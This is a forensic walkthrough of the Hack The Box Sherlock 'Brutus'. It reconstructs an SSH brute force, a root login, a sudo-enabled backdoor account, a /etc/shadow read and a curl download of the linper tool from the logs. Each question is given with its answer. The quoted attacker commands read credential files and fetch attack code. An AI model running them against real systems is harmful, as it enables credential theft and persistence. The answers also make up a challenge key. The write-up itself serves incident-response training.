# BRUTUS - HTB Sherlock Walkthrough

| Field | Value |
|---|---|
| Category | DFIR - Linux log analysis |
| Difficulty | Very Easy |
| Artifacts provided | `auth.log` (rsyslog), `wtmp` (binary login records), `utmp.py` (parser helper) |
| Scenario | A Confluence server's SSH service is brute-forced; attacker gains root, creates a backdoor account, escalates persistence, and stages tooling via sudo |
| Host | `ip-172-31-35-28` (AWS EC2, Ubuntu, kernel `6.2.0-1018-aws`) |

---

## Artifact Notes

The provided `Brutus.zip` uses WinZip AES encryption (compression method 99), which stock `unzip` can't handle - `7z x -phacktheblue Brutus.zip` (standard HTB Sherlock password) extracts it cleanly.

`auth.log` timestamps are in UTC (host is a stock AWS Ubuntu AMI, which defaults to UTC) - confirmed by cross-referencing against `wtmp`, whose epoch `sec` field was decoded with `datetime.utcfromtimestamp()` rather than the bundled `utmp.py`'s `time.localtime()` (which would silently apply the analysis machine's local timezone and skew every timestamp). The two sources agree to within a second once both are read as UTC.

---

## Timeline

```
06:19:52  AuthorizedKeysCommand fails for root (EC2 Instance Connect probe, benign)
06:19:54  Accepted password for root from 203.101.190.9   <- legitimate admin login (baseline)
06:25:01  root cron session (benign)
06:31:33  Failed password for invalid user admin   from 65.2.161.68  <- brute force starts
06:31:42  Failed password for backup               from 65.2.161.68
   ...    48 total failed attempts from 65.2.161.68 across users:
          admin(10) / server_adm(12) / svc_account(11) / backup(9) / root(6)
06:31:40  Accepted password for root from 65.2.161.68 (sshd[2411])  <- credential confirmed,
          session opens and closes in the same second ("Bye Bye") - automated validation,
          not a human at a terminal
06:32:44  Accepted password for root from 65.2.161.68 (sshd[2491])  <- manual interactive login
06:32:45  wtmp USER record: root, pts/1, 65.2.161.68, systemd session 37
06:34:18  useradd: new user cyberjunkie (UID 1002, GID 1002)
06:35:15  usermod: cyberjunkie added to group 'sudo'
06:37:24  sshd[2491] disconnected by user / session closed          <- attacker's first (and only
          manual) SSH session ends
06:37:35  wtmp USER record: cyberjunkie, pts/1, 65.2.161.68           <- attacker returns via backdoor
06:37:57  sudo: cyberjunkie -> cat /etc/shadow
06:39:38  sudo: cyberjunkie -> curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## Q1 - Brute-force source IP

```
$ grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c
     48 65.2.161.68
```

All 48 failed authentication attempts come from a single source.

**Answer: `65.2.161.68`**

---

## Q2 - Account compromised by the brute force

```
Mar  6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```

The brute force sprayed `admin`, `backup`, `server_adm`, `svc_account`, and `root` - the only one that produced an `Accepted password` line is `root`.

**Answer: `root`**

---

## Q3 - UTC timestamp of the manual/interactive login (wtmp)

`auth.log` shows two successful root logins one minute apart: `sshd[2411]` at 06:31:40 (opens and self-terminates in the same second - the brute-force tool confirming the credential works, not a human session) and `sshd[2491]` at 06:32:44 (stays open for ~4.5 minutes while `useradd`/`usermod` happen). Only the second produced a `USER`-type record in `wtmp`:

```
USER  pid=2549  line=pts/1  user=root  host=65.2.161.68  session=0  time=2024-03-06 06:32:45 UTC
```

**Answer: `2024-03-06 06:32:45 UTC`**

---

## Q4 - systemd-logind session number for the attacker's root session

```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

Assigned at the same moment `sshd[2491]` (the manual session from Q3) authenticates.

**Answer: `37`**

---

## Q5 - Backdoor account created for persistence

```
Mar  6 06:34:18 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:35:15 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

Created from the attacker's own pts/1 TTY, then immediately granted sudo membership - a fully privileged backdoor.

**Answer: `cyberjunkie`**

---

## Q6 - MITRE ATT&CK sub-technique

Persistence via a newly created local account maps to:

**Answer: `T1136.001`** - Persistence, Create Account: Local Account

---

## Q7 - End time of the attacker's first SSH session

The manual session identified in Q3 (`sshd[2491]`, systemd session 37) is disconnected by the attacker themselves:

```
Mar  6 06:37:24 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 sshd[2491]: pam_unix(sshd:session): session closed for user root
```

Confirmed independently in `wtmp` by the matching `DEAD` record for pid 2491 at the same second.

**Answer: `2024-03-06 06:37:24 UTC`**

---

## Q8 - sudo command that downloads the script

Eleven seconds after dumping `/etc/shadow`, the attacker uses the backdoor account's sudo rights to pull a Linux privilege-escalation/enumeration tool ([montysecurity/linper](https://github.com/montysecurity/linper)) straight from GitHub:

```
Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**

---

## Attack Chain Summary

```
SSH password spray (65.2.161.68, 5 usernames, 48 attempts)
  -> root credential guessed correctly
  -> automated confirmation connect/disconnect (sshd 2411)
  -> manual interactive login as root, systemd session 37 (sshd 2491)
  -> useradd cyberjunkie + usermod -aG sudo cyberjunkie   [T1136.001 - persistence]
  -> first session closed by attacker
  -> re-enter via cyberjunkie backdoor (no brute force needed this time)
  -> sudo cat /etc/shadow                                  [credential access]
  -> sudo curl linper.sh                                   [tool staging for further enumeration]
```

## Tooling

`utmp.py` (bundled) parses `wtmp`'s fixed 384-byte binary records but decodes the embedded epoch with `time.localtime()`, which is timezone-dependent on whatever machine runs it. For UTC-accurate output, re-decode the same struct layout with `datetime.utcfromtimestamp()` - see the one-off script used above, `parse_wtmp_utc.py`.
